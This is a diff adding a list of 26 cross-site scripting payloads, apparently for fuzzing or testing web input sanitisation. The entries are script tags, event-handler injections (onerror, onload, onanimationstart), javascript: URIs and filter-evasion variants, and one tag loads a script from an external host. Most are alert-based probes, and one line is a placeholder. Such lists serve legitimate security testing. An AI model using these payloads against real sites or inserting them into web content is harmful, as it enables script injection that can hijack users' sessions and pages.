@@ -1,0 +1,26 @@
+<script>alert('XSS')</script>
+<script>console.log('XSS')</script>
+"><script>alert('XSS')</script>
+<img src="invalid" onerror="alert('XSS')">
+<svg onload="alert('XSS')">
+'><img src=x onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+<iframe src="javascript:alert('XSS');">
+'"><iframe src="javascript:alert('XSS');">
+javascript:alert('XSS')
+'><script>alert('XSS')</script>
+<svg><script>123<1>alert('XSS')</script>
+<img src=x oneonerrorrror=alert('XSS')>
+<img src=x oneonerrorrror=alert('XSS')>
+' onmouseover='alert("XSS")'>
+<style>@keyframes x{}</style><img style="animation-name:x" onanimationstart="alert('XSS')">
+<div style="background:url(javascript:alert('XSS'))">
+<a href="javascript:alert('XSS')">Click me</a>
+"><img src="x:alert" onerror="alert('XSS')">
+<script x=">" src="http://example.com/xss.js"></script>
+<script type="text/javascript">
+XSS_CHARS_HERE
+</script>
+<object type="text/html" data="javascript:alert('XSS');">
+<img src=x onerror=alert('XSS')>,
+<svg/onload=alert('XSS')>,
